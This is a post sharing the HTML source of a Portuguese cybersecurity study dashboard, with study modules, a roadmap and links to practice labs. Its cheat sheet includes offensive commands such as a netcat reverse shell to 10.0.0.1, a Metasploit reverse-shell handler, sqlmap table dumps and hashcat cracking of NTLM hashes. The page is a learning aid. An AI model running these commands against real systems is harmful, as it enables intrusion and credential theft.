Site para estudos de cyber securit
esse site eu usei o cloud code e api keys do Groqcloud, sei que pode parecer simples, porem e um inicio e tanto para mim.

<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CyberSec Lab — Ambiente de Estudos</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #070d0a;
    --bg2: #0d1a14;
    --bg3: #112018;
    --green: #00ff88;
    --green2: #00cc6a;
    --green3: #008844;
    --green-dim: #004422;
    --amber: #ffaa00;
    --red: #ff4455;
    --blue: #44aaff;
    --text: #c8ffe0;
    --text2: #6db88a;
    --text3: #3a6b4a;
    --border: #1a3d28;
    --border2: #0f2a1c;
    --mono: 'JetBrains Mono', monospace;
    --sans: 'Syne', sans-serif;
  }
 
  * { box-sizing: border-box; margin: 0; padding: 0; }
 
  body {
    background: var(--bg);
    color: var(--text);
    font-family: var(--mono);
    min-height: 100vh;
    overflow-x: hidden;
  }
 
  /* Scanlines overlay */
  body::before {
    content: '';
    position: fixed;
    inset: 0;
    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
    pointer-events: none;
    z-index: 9999;
  }
 
  /* Grid background */
  .grid-bg {
    position: fixed;
    inset: 0;
    background-image:
      linear-gradient(var(--border2) 1px, transparent 1px),
      linear-gradient(90deg, var(--border2) 1px, transparent 1px);
    background-size: 40px 40px;
    opacity: 0.4;
    pointer-events: none;
    z-index: 0;
  }
 
  /* Header */
  header {
    position: relative;
    z-index: 10;
    border-bottom: 1px solid var(--border);
    padding: 0 2rem;
    display: flex;
    align-items: center;
    justify-content: space-between;
    height: 60px;
    background: rgba(7,13,10,0.95);
    backdrop-filter: blur(10px);
  }
 
  .logo {
    font-family: var(--sans);
    font-weight: 800;
    font-size: 1.1rem;
    color: var(--green);
    letter-spacing: -0.02em;
    display: flex;
    align-items: center;
    gap: 8px;
  }
 
  .logo-icon {
    width: 28px;
    height: 28px;
    border: 1.5px solid var(--green);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 14px;
  }
 
  .logo span { color: var(--text2); font-weight: 400; font-size: 0.75rem; margin-left: 4px; }
 
  .status-bar {
    display: flex;
    align-items: center;
    gap: 1.5rem;
    font-size: 0.7rem;
    color: var(--text3);
  }
 
  .status-dot {
    width: 6px;
    height: 6px;
    border-radius: 50%;
    background: var(--green);
    box-shadow: 0 0 8px var(--green);
    animation: pulse 2s infinite;
    display: inline-block;
    margin-right: 4px;
  }
 
  @keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.4; }
  }
 
  /* Main layout */
  main {
    position: relative;
    z-index: 10;
    max-width: 1200px;
    margin: 0 auto;
    padding: 2rem;
  }
 
  /* Hero terminal */
  .hero-terminal {
    border: 1px solid var(--border);
    background: var(--bg2);
    margin-bottom: 2.5rem;
    overflow: hidden;
  }
 
  .terminal-bar {
    background: var(--bg3);
    border-bottom: 1px solid var(--border);
    padding: 8px 16px;
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 0.7rem;
    color: var(--text3);
  }
 
  .term-dot { width: 10px; height: 10px; border-radius: 50%; }
  .td-red { background: #ff5f57; }
  .td-yellow { background: #ffbd2e; }
  .td-green { background: #28ca42; }
 
  .terminal-body {
    padding: 1.5rem 2rem;
    font-size: 0.85rem;
    line-height: 1.8;
  }
 
  .term-prompt { color: var(--green2); }
  .term-cmd { color: var(--text); }
  .term-output { color: var(--text2); }
  .term-highlight { color: var(--green); font-weight: 700; }
  .term-cursor {
    display: inline-block;
    width: 8px;
    height: 1em;
    background: var(--green);
    animation: blink 1s step-end infinite;
    vertical-align: text-bottom;
    margin-left: 2px;
  }
  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
 
  /* Section title */
  .section-label {
    font-size: 0.65rem;
    color: var(--text3);
    letter-spacing: 0.2em;
    text-transform: uppercase;
    margin-bottom: 1rem;
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .section-label::after {
    content: '';
    flex: 1;
    height: 1px;
    background: var(--border);
  }
 
  /* Module grid */
  .modules-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
    gap: 1.5px;
    background: var(--border);
    border: 1px solid var(--border);
    margin-bottom: 2.5rem;
  }
 
  .module-card {
    background: var(--bg2);
    padding: 1.5rem;
    cursor: pointer;
    transition: background 0.15s;
    position: relative;
    overflow: hidden;
  }
 
  .module-card:hover { background: var(--bg3); }
  .module-card:hover .module-arrow { transform: translateX(4px); }
 
  .module-card::before {
    content: '';
    position: absolute;
    left: 0;
    top: 0;
    bottom: 0;
    width: 3px;
    background: var(--green-dim);
    transition: background 0.15s;
  }
  .module-card:hover::before { background: var(--green); }
 
  .module-card.amber::before { background: #553300; }
  .module-card.amber:hover::before { background: var(--amber); }
  .module-card.red::before { background: #440011; }
  .module-card.red:hover::before { background: var(--red); }
  .module-card.blue::before { background: #001133; }
  .module-card.blue:hover::before { background: var(--blue); }
 
  .module-header {
    display: flex;
    justify-content: space-between;
    align-items: flex-start;
    margin-bottom: 0.75rem;
  }
 
  .module-tag {
    font-size: 0.6rem;
    letter-spacing: 0.15em;
    text-transform: uppercase;
    padding: 2px 8px;
    border: 1px solid;
  }
 
  .tag-green { color: var(--green2); border-color: var(--green-dim); }
  .tag-amber { color: var(--amber); border-color: #553300; }
  .tag-red { color: var(--red); border-color: #440011; }
  .tag-blue { color: var(--blue); border-color: #001133; }
 
  .module-level {
    font-size: 0.65rem;
    color: var(--text3);
    letter-spacing: 0.1em;
  }
 
  .module-title {
    font-family: var(--sans);
    font-weight: 600;
    font-size: 1rem;
    color: var(--text);
    margin-bottom: 0.4rem;
    line-height: 1.3;
  }
 
  .module-desc {
    font-size: 0.72rem;
    color: var(--text2);
    line-height: 1.6;
    margin-bottom: 1rem;
  }
 
  .module-footer {
    display: flex;
    align-items: center;
    justify-content: space-between;
    font-size: 0.65rem;
    color: var(--text3);
  }
 
  .module-topics {
    display: flex;
    gap: 6px;
    flex-wrap: wrap;
  }
 
  .topic-tag {
    background: var(--bg);
    border: 1px solid var(--border);
    padding: 2px 6px;
    font-size: 0.6rem;
    color: var(--text3);
  }
 
  .module-arrow {
    color: var(--text3);
    font-size: 0.8rem;
    transition: transform 0.15s;
  }
 
  /* Progress bar */
  .progress-section {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 1.5px;
    background: var(--border);
    border: 1px solid var(--border);
    margin-bottom: 2.5rem;
  }
 
  .progress-card {
    background: var(--bg2);
    padding: 1.25rem 1.5rem;
  }
 
  .progress-label {
    font-size: 0.65rem;
    color: var(--text3);
    letter-spacing: 0.1em;
    text-transform: uppercase;
    margin-bottom: 0.5rem;
  }
 
  .progress-value {
    font-family: var(--sans);
    font-size: 2rem;
    font-weight: 800;
    color: var(--green);
    line-height: 1;
    margin-bottom: 0.75rem;
  }
 
  .progress-bar-track {
    height: 2px;
    background: var(--border);
    position: relative;
    overflow: hidden;
  }
 
  .progress-bar-fill {
    height: 100%;
    background: var(--green);
    box-shadow: 0 0 8px var(--green);
    transition: width 1s ease;
  }
 
  .progress-bar-fill.amber { background: var(--amber); box-shadow: 0 0 8px var(--amber); }
 
  /* Roadmap */
  .roadmap {
    border: 1px solid var(--border);
    background: var(--bg2);
    padding: 1.5rem 2rem;
    margin-bottom: 2.5rem;
  }
 
  .roadmap-title {
    font-family: var(--sans);
    font-weight: 800;
    font-size: 1.1rem;
    color: var(--green);
    margin-bottom: 1.5rem;
  }
 
  .roadmap-track {
    display: flex;
    flex-direction: column;
    gap: 0;
  }
 
  .road-item {
    display: flex;
    align-items: flex-start;
    gap: 1rem;
    padding: 0.75rem 0;
    border-bottom: 1px dashed var(--border);
  }
  .road-item:last-child { border-bottom: none; }
 
  .road-num {
    width: 28px;
    height: 28px;
    border: 1px solid var(--border);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 0.7rem;
    color: var(--text3);
    flex-shrink: 0;
    margin-top: 2px;
  }
  .road-num.active {
    border-color: var(--green);
    color: var(--green);
    background: rgba(0,255,136,0.05);
  }
  .road-num.done {
    border-color: var(--green3);
    color: var(--green3);
    background: var(--green-dim);
  }
 
  .road-content { flex: 1; }
  .road-title { font-size: 0.85rem; color: var(--text); margin-bottom: 0.2rem; }
  .road-sub { font-size: 0.7rem; color: var(--text3); }
  .road-badge {
    font-size: 0.6rem;
    padding: 2px 8px;
    border: 1px solid;
    flex-shrink: 0;
    margin-top: 4px;
  }
  .badge-done { color: var(--green3); border-color: var(--green-dim); }
  .badge-active { color: var(--amber); border-color: #553300; animation: pulse 2s infinite; }
  .badge-locked { color: var(--text3); border-color: var(--border); }
 
  /* Resources */
  .resources-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
    gap: 1.5px;
    background: var(--border);
    border: 1px solid var(--border);
    margin-bottom: 2.5rem;
  }
 
  .resource-item {
    background: var(--bg2);
    padding: 1.25rem;
    display: flex;
    flex-direction: column;
    gap: 0.4rem;
    cursor: pointer;
    transition: background 0.15s;
    text-decoration: none;
  }
  .resource-item:hover { background: var(--bg3); }
 
  .res-icon { font-size: 1.2rem; margin-bottom: 4px; }
  .res-name { font-size: 0.8rem; color: var(--text); }
  .res-type { font-size: 0.65rem; color: var(--text3); }
 
  /* Cheatsheet */
  .cheatsheet {
    border: 1px solid var(--border);
    background: var(--bg2);
    margin-bottom: 2.5rem;
    overflow: hidden;
  }
 
  .cheat-tabs {
    display: flex;
    border-bottom: 1px solid var(--border);
    overflow-x: auto;
  }
 
  .cheat-tab {
    padding: 10px 20px;
    font-size: 0.7rem;
    color: var(--text3);
    cursor: pointer;
    border: none;
    background: none;
    border-bottom: 2px solid transparent;
    white-space: nowrap;
    font-family: var(--mono);
    letter-spacing: 0.05em;
    transition: all 0.15s;
  }
  .cheat-tab:hover { color: var(--text2); background: rgba(0,255,136,0.03); }
  .cheat-tab.active {
    color: var(--green);
    border-bottom-color: var(--green);
    background: rgba(0,255,136,0.05);
  }
 
  .cheat-content { display: none; padding: 1.5rem 2rem; }
  .cheat-content.active { display: block; }
 
  .cmd-block {
    background: var(--bg);
    border: 1px solid var(--border);
    padding: 1rem 1.25rem;
    margin-bottom: 1rem;
    border-left: 3px solid var(--green-dim);
  }
 
  .cmd-comment { color: var(--text3); font-size: 0.72rem; margin-bottom: 4px; }
  .cmd-line { color: var(--green2); font-size: 0.8rem; margin-bottom: 2px; font-family: var(--mono); }
  .cmd-var { color: var(--amber); }
  .cmd-flag { color: var(--blue); }
  .cmd-arg { color: var(--text); }
 
  /* Footer */
  footer {
    border-top: 1px solid var(--border);
    padding: 1.5rem 2rem;
    text-align: center;
    font-size: 0.65rem;
    color: var(--text3);
    letter-spacing: 0.1em;
    position: relative;
    z-index: 10;
  }
 
  /* Responsive */
  @media (max-width: 640px) {
    .progress-section { grid-template-columns: 1fr; }
    main { padding: 1rem; }
    .modules-grid { grid-template-columns: 1fr; }
    .resources-grid { grid-template-columns: 1fr 1fr; }
  }
</style>
</head>
<body>
 
<div class="grid-bg"></div>
 
<header>
  <div class="logo">
    <div class="logo-icon">[/]</div>
    CyberSec<span>LAB — Plataforma de Estudos</span>
  </div>
  <div class="status-bar">
    <span><span class="status-dot"></span>Sistema online</span>
    <span id="clock">--:--:--</span>
    <span>v1.0.0</span>
  </div>
</header>
 
<main>
 
  <!-- Terminal hero -->
  <div class="hero-terminal">
    <div class="terminal-bar">
      <div class="term-dot td-red"></div>
      <div class="term-dot td-yellow"></div>
      <div class="term-dot td-green"></div>
      <span style="margin-left:8px;">cybersec@lab:~</span>
    </div>
    <div class="terminal-body">
      <div><span class="term-prompt">root@lab</span><span class="term-cmd">:~# cat boas_vindas.txt</span></div>
      <div style="margin: 0.75rem 0 0.5rem;">
        <span class="term-highlight">⠀⠀██████╗██╗   ██╗██████╗ ███████╗██████╗ ███████╗███████╗ ██████╗</span>
      </div>
      <div class="term-output" style="margin-bottom: 0.75rem;">
        Bem-vindo ao <span class="term-highlight">CyberSec Lab</span> — seu ambiente de estudos em segurança ofensiva e defensiva.
      </div>
      <div><span class="term-prompt">root@lab</span><span class="term-cmd">:~# ./start_learning.sh --modulo redes --nivel iniciante</span></div>
      <div class="term-output" style="margin: 0.25rem 0;">
        [<span style="color:var(--green)">OK</span>] Módulos carregados: Redes, Web, Criptografia, Forense, Pentest<br>
        [<span style="color:var(--green)">OK</span>] Laboratórios virtuais: disponíveis<br>
        [<span style="color:var(--amber)">DICA</span>] Comece pelos fundamentos de redes antes de partir para exploração<br>
      </div>
      <div><span class="term-prompt">root@lab</span><span class="term-cmd">:~# </span><span class="term-cursor"></span></div>
    </div>
  </div>
 
  <!-- Progress -->
  <div class="section-label">// progresso de estudos</div>
  <div class="progress-section">
    <div class="progress-card">
      <div class="progress-label">módulos concluídos</div>
      <div class="progress-value">03</div>
      <div style="font-size:0.7rem;color:var(--text3);margin-bottom:8px;">de 12 módulos totais</div>
      <div class="progress-bar-track">
        <div class="progress-bar-fill" style="width:25%"></div>
      </div>
    </div>
    <div class="progress-card">
      <div class="progress-label">desafios CTF</div>
      <div class="progress-value" style="color:var(--amber);">07</div>
      <div style="font-size:0.7rem;color:var(--text3);margin-bottom:8px;">resolvidos esta semana</div>
      <div class="progress-bar-track">
        <div class="progress-bar-fill amber" style="width:58%"></div>
      </div>
    </div>
    <div class="progress-card">
      <div class="progress-label">horas de estudo</div>
      <div class="progress-value">42h</div>
      <div style="font-size:0.7rem;color:var(--text3);margin-bottom:8px;">acumuladas no total</div>
      <div class="progress-bar-track">
        <div class="progress-bar-fill" style="width:70%"></div>
      </div>
    </div>
    <div class="progress-card">
      <div class="progress-label">próxima meta</div>
      <div class="progress-value" style="color:var(--blue);">CEH</div>
      <div style="font-size:0.7rem;color:var(--text3);margin-bottom:8px;">Certificação Ethical Hacker</div>
      <div class="progress-bar-track">
        <div class="progress-bar-fill" style="width:35%;background:var(--blue);box-shadow:0 0 8px var(--blue)"></div>
      </div>
    </div>
  </div>
 
  <!-- Módulos -->
  <div class="section-label">// módulos de estudo</div>
  <div class="modules-grid">
 
    <div class="module-card" onclick="openModule('redes')">
      <div class="module-header">
        <span class="module-tag tag-green">Fundamentos</span>
        <span class="module-level">NÍVEL 01</span>
      </div>
      <div class="module-title">Redes & Protocolos</div>
      <div class="module-desc">TCP/IP, modelo OSI, DNS, HTTP/S, firewalls, sniffing de pacotes e análise de tráfego com Wireshark.</div>
      <div class="module-footer">
        <div class="module-topics">
          <span class="topic-tag">TCP/IP</span>
          <span class="topic-tag">Wireshark</span>
          <span class="topic-tag">DNS</span>
        </div>
        <span class="module-arrow">→</span>
      </div>
    </div>
 
    <div class="module-card" onclick="openModule('linux')">
      <div class="module-header">
        <span class="module-tag tag-green">Fundamentos</span>
        <span class="module-level">NÍVEL 01</span>
      </div>
      <div class="module-title">Linux para Hacking</div>
      <div class="module-desc">Comandos essenciais, permissões, scripting Bash, gerenciamento de processos e configuração do Kali Linux.</div>
      <div class="module-footer">
        <div class="module-topics">
          <span class="topic-tag">Bash</span>
          <span class="topic-tag">Kali</span>
          <span class="topic-tag">CLI</span>
        </div>
        <span class="module-arrow">→</span>
      </div>
    </div>
 
    <div class="module-card amber" onclick="openModule('web')">
      <div class="module-header">
        <span class="module-tag tag-amber">Intermediário</span>
        <span class="module-level">NÍVEL 02</span>
      </div>
      <div class="module-title">Web Application Security</div>
      <div class="module-desc">OWASP Top 10, SQL Injection, XSS, CSRF, autenticação fraca, IDOR e exploração com Burp Suite.</div>
      <div class="module-footer">
        <div class="module-topics">
          <span class="topic-tag">OWASP</span>
          <span class="topic-tag">SQLi</span>
          <span class="topic-tag">Burp</span>
        </div>
        <span class="module-arrow">→</span>
      </div>
    </div>
 
    <div class="module-card amber" onclick="openModule('pentest')">
      <div class="module-header">
        <span class="module-tag tag-amber">Intermediário</span>
        <span class="module-level">NÍVEL 02</span>
      </div>
      <div class="module-title">Pentest & Enumeração</div>
      <div class="module-desc">Reconhecimento, scanning com Nmap, enumeração de serviços, exploração com Metasploit e pós-exploração.</div>
      <div class="module-footer">
        <div class="module-topics">
          <span class="topic-tag">Nmap</span>
          <span class="topic-tag">Metasploit</span>
          <span class="topic-tag">OSINT</span>
        </div>
        <span class="module-arrow">→</span>
      </div>
    </div>
 
    <div class="module-card red" onclick="openModule('cripto')">
      <div class="module-header">
        <span class="module-tag tag-red">Avançado</span>
        <span class="module-level">NÍVEL 03</span>
      </div>
      <div class="module-title">Criptografia & Esteganografia</div>
      <div class="module-desc">Algoritmos simétricos e assimétricos, hashes, PKI, TLS/SSL, quebra de hashes e mensagens ocultas.</div>
      <div class="module-footer">
        <div class="module-topics">
          <span class="topic-tag">RSA</span>
          <span class="topic-tag">AES</span>
          <span class="topic-tag">Hash</span>
        </div>
        <span class="module-arrow">→</span>
      </div>
    </div>
 
    <div class="module-card red" onclick="openModule('forense')">
      <div class="module-header">
        <span class="module-tag tag-red">Avançado</span>
        <span class="module-level">NÍVEL 03</span>
      </div>
      <div class="module-title">Forense Digital & Malware</div>
      <div class="module-desc">Análise de memória, disk forensics, reverse engineering, análise estática/dinâmica de malware e incident response.</div>
      <div class="module-footer">
        <div class="module-topics">
          <span class="topic-tag">Volatility</span>
          <span class="topic-tag">IDA Pro</span>
          <span class="topic-tag">RE</span>
        </div>
        <span class="module-arrow">→</span>
      </div>
    </div>
 
    <div class="module-card blue" onclick="openModule('cloud')">
      <div class="module-header">
        <span class="module-tag tag-blue">Especialização</span>
        <span class="module-level">NÍVEL 04</span>
      </div>
      <div class="module-title">Cloud Security (AWS/Azure)</div>
      <div class="module-desc">IAM misconfigurations, S3 buckets expostos, container security, serverless attacks e cloud pentesting.</div>
      <div class="module-footer">
        <div class="module-topics">
          <span class="topic-tag">AWS</span>
          <span class="topic-tag">Docker</span>
          <span class="topic-tag">IAM</span>
        </div>
        <span class="module-arrow">→</span>
      </div>
    </div>
 
    <div class="module-card blue" onclick="openModule('re')">
      <div class="module-header">
        <span class="module-tag tag-blue">Especialização</span>
        <span class="module-level">NÍVEL 04</span>
      </div>
      <div class="module-title">Engenharia Reversa</div>
      <div class="module-desc">Assembly x86/x64, análise de binários, buffer overflow, exploração de vulnerabilidades e desenvolvimento de exploits.</div>
      <div class="module-footer">
        <div class="module-topics">
          <span class="topic-tag">GDB</span>
          <span class="topic-tag">x64asm</span>
          <span class="topic-tag">PWN</span>
        </div>
        <span class="module-arrow">→</span>
      </div>
    </div>
 
  </div>
 
  <!-- Roadmap -->
  <div class="section-label">// trilha recomendada</div>
  <div class="roadmap">
    <div class="roadmap-title">Roadmap — Do Zero ao Pentest</div>
    <div class="roadmap-track">
 
      <div class="road-item">
        <div class="road-num done">✓</div>
        <div class="road-content">
          <div class="road-title">Fundamentos de Redes (TCP/IP, OSI, DNS)</div>
          <div class="road-sub">2-3 semanas · Wireshark, Cisco Packet Tracer</div>
        </div>
        <div class="road-badge badge-done">concluído</div>
      </div>
 
      <div class="road-item">
        <div class="road-num done">✓</div>
        <div class="road-content">
          <div class="road-title">Linux essencial e scripting Bash</div>
          <div class="road-sub">2-3 semanas · Kali Linux, OverTheWire Bandit</div>
        </div>
        <div class="road-badge badge-done">concluído</div>
      </div>
 
      <div class="road-item">
        <div class="road-num done">✓</div>
        <div class="road-content">
          <div class="road-title">Programação para hacking (Python)</div>
          <div class="road-sub">3-4 semanas · scripts de automação e exploração</div>
        </div>
        <div class="road-badge badge-done">concluído</div>
      </div>
 
      <div class="road-item">
        <div class="road-num active">4</div>
        <div class="road-content">
          <div class="road-title">Segurança Web — OWASP Top 10</div>
          <div class="road-sub">4-5 semanas · DVWA, WebGoat, TryHackMe</div>
        </div>
        <div class="road-badge badge-active">em andamento</div>
      </div>
 
      <div class="road-item">
        <div class="road-num">5</div>
        <div class="road-content">
          <div class="road-title">Pentest — Reconhecimento e Exploração</div>
          <div class="road-sub">5-6 semanas · Nmap, Metasploit, Hack The Box</div>
        </div>
        <div class="road-badge badge-locked">bloqueado</div>
      </div>
 
      <div class="road-item">
        <div class="road-num">6</div>
        <div class="road-content">
          <div class="road-title">Criptografia e Active Directory</div>
          <div class="road-sub">4-5 semanas · Kerberos, Pass-the-Hash, mimikatz</div>
        </div>
        <div class="road-badge badge-locked">bloqueado</div>
      </div>
 
      <div class="road-item">
        <div class="road-num">7</div>
        <div class="road-content">
          <div class="road-title">CTFs e Certificação (eJPT / CEH / OSCP)</div>
          <div class="road-sub">contínuo · prática em labs reais</div>
        </div>
        <div class="road-badge badge-locked">bloqueado</div>
      </div>
 
    </div>
  </div>
 
  <!-- Cheatsheet -->
  <div class="section-label">// cheat sheets rápidos</div>
  <div class="cheatsheet">
    <div class="cheat-tabs">
      <button class="cheat-tab active" onclick="switchTab('nmap')">nmap</button>
      <button class="cheat-tab" onclick="switchTab('sqlmap')">sqlmap</button>
      <button class="cheat-tab" onclick="switchTab('metasploit')">metasploit</button>
      <button class="cheat-tab" onclick="switchTab('hashcat')">hashcat</button>
      <button class="cheat-tab" onclick="switchTab('netcat')">netcat</button>
    </div>
 
    <div id="tab-nmap" class="cheat-content active">
      <div class="cmd-block">
        <div class="cmd-comment"># Scan básico de portas</div>
        <div class="cmd-line">nmap <span class="cmd-flag">-sV -sC</span> <span class="cmd-var">192.168.1.1</span></div>
      </div>
      <div class="cmd-block">
        <div class="cmd-comment"># Scan agressivo com detecção de OS</div>
        <div class="cmd-line">nmap <span class="cmd-flag">-A -T4 -p-</span> <span class="cmd-var">192.168.1.1</span></div>
      </div>
      <div class="cmd-block">
        <div class="cmd-comment"># Scan UDP + varredura silenciosa</div>
        <div class="cmd-line">nmap <span class="cmd-flag">-sU -sS --open</span> <span class="cmd-flag">-p</span> <span class="cmd-arg">1-1000</span> <span class="cmd-var">192.168.1.0/24</span></div>
      </div>
      <div class="cmd-block">
        <div class="cmd-comment"># Salvar output em todos os formatos</div>
        <div class="cmd-line">nmap <span class="cmd-flag">-oA</span> <span class="cmd-arg">resultado</span> <span class="cmd-var">alvo.com</span></div>
      </div>
    </div>
 
    <div id="tab-sqlmap" class="cheat-content">
      <div class="cmd-block">
        <div class="cmd-comment"># Teste básico de injeção SQL</div>
        <div class="cmd-line">sqlmap <span class="cmd-flag">-u</span> <span class="cmd-var">"http://site.com/page?id=1"</span> <span class="cmd-flag">--dbs</span></div>
      </div>
      <div class="cmd-block">
        <div class="cmd-comment"># Dump de tabela específica</div>
        <div class="cmd-line">sqlmap <span class="cmd-flag">-u</span> <span class="cmd-var">URL</span> <span class="cmd-flag">-D</span> <span class="cmd-arg">dbname</span> <span class="cmd-flag">-T</span> <span class="cmd-arg">users</span> <span class="cmd-flag">--dump</span></div>
      </div>
      <div class="cmd-block">
        <div class="cmd-comment"># Com cookie de sessão autenticada</div>
        <div class="cmd-line">sqlmap <span class="cmd-flag">-u</span> <span class="cmd-var">URL</span> <span class="cmd-flag">--cookie=</span><span class="cmd-arg">"PHPSESSID=abc"</span> <span class="cmd-flag">--level=5</span></div>
      </div>
    </div>
 
    <div id="tab-metasploit" class="cheat-content">
      <div class="cmd-block">
        <div class="cmd-comment"># Iniciar o console</div>
        <div class="cmd-line">msfconsole <span class="cmd-flag">-q</span></div>
      </div>
      <div class="cmd-block">
        <div class="cmd-comment"># Buscar exploit por CVE</div>
        <div class="cmd-line">msf> search <span class="cmd-var">CVE-2021-44228</span></div>
      </div>
      <div class="cmd-block">
        <div class="cmd-comment"># Usar exploit e configurar</div>
        <div class="cmd-line">msf> use <span class="cmd-arg">exploit/multi/handler</span></div>
        <div class="cmd-line">msf> set PAYLOAD <span class="cmd-arg">linux/x64/shell_reverse_tcp</span></div>
        <div class="cmd-line">msf> set LHOST <span class="cmd-var">10.0.0.1</span> LPORT <span class="cmd-var">4444</span></div>
        <div class="cmd-line">msf> run</div>
      </div>
    </div>
 
    <div id="tab-hashcat" class="cheat-content">
      <div class="cmd-block">
        <div class="cmd-comment"># Quebrar hash MD5 com wordlist</div>
        <div class="cmd-line">hashcat <span class="cmd-flag">-m 0</span> <span class="cmd-var">hash.txt</span> <span class="cmd-arg">rockyou.txt</span></div>
      </div>
      <div class="cmd-block">
        <div class="cmd-comment"># Ataque de força bruta — SHA256 (modo 1400)</div>
        <div class="cmd-line">hashcat <span class="cmd-flag">-m 1400 -a 3</span> <span class="cmd-var">hash.txt</span> <span class="cmd-arg">?a?a?a?a?a?a</span></div>
      </div>
      <div class="cmd-block">
        <div class="cmd-comment"># NTLM (Windows passwords)</div>
        <div class="cmd-line">hashcat <span class="cmd-flag">-m 1000</span> <span class="cmd-var">ntlm.txt</span> <span class="cmd-arg">rockyou.txt</span> <span class="cmd-flag">--force</span></div>
      </div>
    </div>
 
    <div id="tab-netcat" class="cheat-content">
      <div class="cmd-block">
        <div class="cmd-comment"># Ouvir em uma porta (listener)</div>
        <div class="cmd-line">nc <span class="cmd-flag">-lvnp</span> <span class="cmd-var">4444</span></div>
      </div>
      <div class="cmd-block">
        <div class="cmd-comment"># Conectar a um host</div>
        <div class="cmd-line">nc <span class="cmd-var">192.168.1.10</span> <span class="cmd-arg">80</span></div>
      </div>
      <div class="cmd-block">
        <div class="cmd-comment"># Reverse shell simples</div>
        <div class="cmd-line">nc <span class="cmd-flag">-e</span> /bin/bash <span class="cmd-var">10.0.0.1</span> <span class="cmd-arg">4444</span></div>
      </div>
      <div class="cmd-block">
        <div class="cmd-comment"># Transferir arquivo</div>
        <div class="cmd-line">nc <span class="cmd-flag">-lvnp</span> <span class="cmd-var">4444</span> <span class="cmd-flag">></span> <span class="cmd-arg">arquivo.zip</span></div>
        <div class="cmd-line">nc <span class="cmd-var">10.0.0.1</span> <span class="cmd-arg">4444</span> <span class="cmd-flag"><</span> <span class="cmd-arg">arquivo.zip</span></div>
      </div>
    </div>
  </div>
 
  <!-- Recursos externos -->
  <div class="section-label">// laboratórios & recursos</div>
  <div class="resources-grid">
    <a href="https://tryhackme.com" target="_blank" class="resource-item">
      <div class="res-icon">🎯</div>
      <div class="res-name">TryHackMe</div>
      <div class="res-type">Labs guiados • Iniciante</div>
    </a>
    <a href="https://hackthebox.com" target="_blank" class="resource-item">
      <div class="res-icon">📦</div>
      <div class="res-name">Hack The Box</div>
      <div class="res-type">Máquinas reais • Intermediário</div>
    </a>
    <a href="https://portswigger.net/web-security" target="_blank" class="resource-item">
      <div class="res-icon">🕸️</div>
      <div class="res-name">PortSwigger</div>
      <div class="res-type">Web Security Academy</div>
    </a>
    <a href="https://overthewire.org" target="_blank" class="resource-item">
      <div class="res-icon">⚔️</div>
      <div class="res-name">OverTheWire</div>
      <div class="res-type">Wargames • Linux skills</div>
    </a>
    <a href="https://picoctf.org" target="_blank" class="resource-item">
      <div class="res-icon">🏁</div>
      <div class="res-name">picoCTF</div>
      <div class="res-type">CTF educativo • Gratuito</div>
    </a>
    <a href="https://vulnhub.com" target="_blank" class="resource-item">
      <div class="res-icon">💾</div>
      <div class="res-name">VulnHub</div>
      <div class="res-type">VMs vulneráveis • Local</div>
    </a>
  </div>
 
</main>
 
<footer>
  CyberSec Lab v1.0 · Para fins educacionais · Use de forma ética e responsável
</footer>
 
<script>
  // Clock
  function updateClock() {
    const now = new Date();
    document.getElementById('clock').textContent =
      now.toLocaleTimeString('pt-BR', {hour:'2-digit',minute:'2-digit',second:'2-digit'});
  }
  updateClock();
  setInterval(updateClock, 1000);
 
  // Tabs
  function switchTab(name) {
    document.querySelectorAll('.cheat-tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.cheat-content').forEach(c => c.classList.remove('active'));
    event.target.classList.add('active');
    document.getElementById('tab-' + name).classList.add('active');
  }
 
  // Module click
  function openModule(name) {
    const msgs = {
      redes: 'redes',
      linux: 'Linux para hacking',
      web: 'segurança web e OWASP',
      pentest: 'pentest e Metasploit',
      cripto: 'criptografia',
      forense: 'forense digital',
      cloud: 'cloud security',
      re: 'engenharia reversa'
    };
    alert('📚 Módulo: ' + (msgs[name] || name) + '\n\nNesta versão demo, clique nos recursos externos abaixo para praticar online!');
  }
 
  // Animate progress bars on load
  window.addEventListener('load', () => {
    document.querySelectorAll('.progress-bar-fill').forEach(bar => {
      const w = bar.style.width;
      bar.style.width = '0';
      setTimeout(() => { bar.style.width = w; }, 300);
    });
  });
</script>
 
</body>
</html>
